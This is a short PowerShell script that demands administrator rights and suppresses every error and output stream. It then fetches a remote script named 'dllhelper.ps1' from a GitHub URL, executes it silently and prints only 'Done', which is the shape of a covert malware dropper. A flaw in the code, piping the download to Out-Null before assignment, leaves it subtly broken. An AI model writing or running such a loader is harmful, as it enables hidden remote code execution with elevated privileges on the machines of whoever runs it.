#Requires -RunAsAdministrator

$ErrorActionPreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"
$InformationPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$remoteUrl = "https://raw.githubusercontent.com/printipel/Screesh/main/dllhelper.ps1"

try {
    $script = Invoke-RestMethod -Uri $remoteUrl -UseBasicParsing 2>$null | Out-Null

    if ($script) {
        $sb = [scriptblock]::Create($script)
        & $sb *> $null
    }
}
catch {
}
finally {
    Write-Output "Done"
}
